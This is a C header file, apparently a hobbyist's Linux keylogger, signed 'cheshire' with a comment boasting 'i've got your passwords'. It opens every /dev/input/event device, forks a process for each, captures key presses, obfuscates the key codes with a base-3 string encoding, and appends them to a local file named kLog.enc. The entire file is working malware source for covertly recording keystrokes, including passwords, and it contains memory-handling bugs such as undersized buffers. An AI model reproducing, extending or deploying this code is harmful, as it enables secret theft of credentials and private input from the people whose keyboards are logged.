/*
* Keylogger header file for ubuntu by cheshire in ~wonderland
* roeses r r3d violets r blue i'v got your passwords how doya do
*/

#ifndef KEY_LOG_MODULE
#define KEY_LOG_MODULE

#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>

#define CBASE 3

char* encodeNum(int key);
void writeToFile(char* data);

// counting sys
char cS[3][20];
// file discriptor arrays beacuses ubuntu sucks
int fd[10];
// inputs paths beacuse well ubuntu sucks
char eventP[10][20];

// call to start keylogger <- will fork into 9 threads and return 0 
int startKeyLogger()
{
	strcpy(cS[0], "ch3sh1r3\0");
	strcpy(cS[1], "wa5\0");
	strcpy(cS[2], "h3re\0");
	// all possible input paths
	strcpy(eventP[0], "/dev/input/event0\0");
	strcpy(eventP[1], "/dev/input/event1\0");
	strcpy(eventP[2], "/dev/input/event2\0");
	strcpy(eventP[3], "/dev/input/event3\0");
	strcpy(eventP[4], "/dev/input/event4\0");
	strcpy(eventP[5], "/dev/input/event5\0");
	strcpy(eventP[6], "/dev/input/event6\0");
	strcpy(eventP[7], "/dev/input/event7\0");
	strcpy(eventP[8], "/dev/input/event8\0");
	strcpy(eventP[9], "/dev/input/event9\0");
	// create file discriptors for all possible paths
	for (int i = 0; i < 10; i++)
	{	
		fd[i] = open(eventP[i], O_RDONLY);
	}
	for (int i = 0; i < 10; i++)
	{
		pid_t pid = fork();
		if (pid == 0)
		{
			while (true)
			{
				struct input_event ev;
				read(fd[i], &ev, sizeof(struct input_event));
				if (ev.type == 1) 
				{
					char* encKeyID = encodeNum((ev.code * 666));
					char* encKeyValue = encodeNum((ev.value * 666));
					size_t len = strlen(encKeyID) + strlen(encKeyValue) + 1;
					char pressEnc[len];
					strcpy(pressEnc, encKeyID);
					strcat(pressEnc, "/\0");
					strcat(pressEnc, encKeyValue);
					free(encKeyID);
					free(encKeyValue);
					writeToFile(pressEnc);
				}	
			}
		}
	}
	return 0;
}

// record event to drive
void writeToFile(char* data)
{
	FILE* f = fopen("kLog.enc", "a");
	fputs(data, f);
	fputs("\n", f);
	fclose(f);
}

// encrypt key code
char* encodeNum(int key)
{
	char encodedKey[(300 * 20)];	
	memset(encodedKey, '\0', (300 * 20));
	int cNum[300];
	int tick = 0;
	if (key == 0) 
	{
		cNum[0] = 0;
		tick++;
	}
	while (key != 0) 
	{
		cNum[tick] = key % CBASE;
		key = key / CBASE;
		if (tick > 298) 
		{
			break;
		}
		tick++;
	}
	for (int i = (tick - 1); i > -1; i--)
	{
		strcat(encodedKey, cS[cNum[i]]);	
	}
	char* encKey = malloc(strlen(encodedKey));
	strcpy(encKey, encodedKey);
	return encKey;
}
#endif
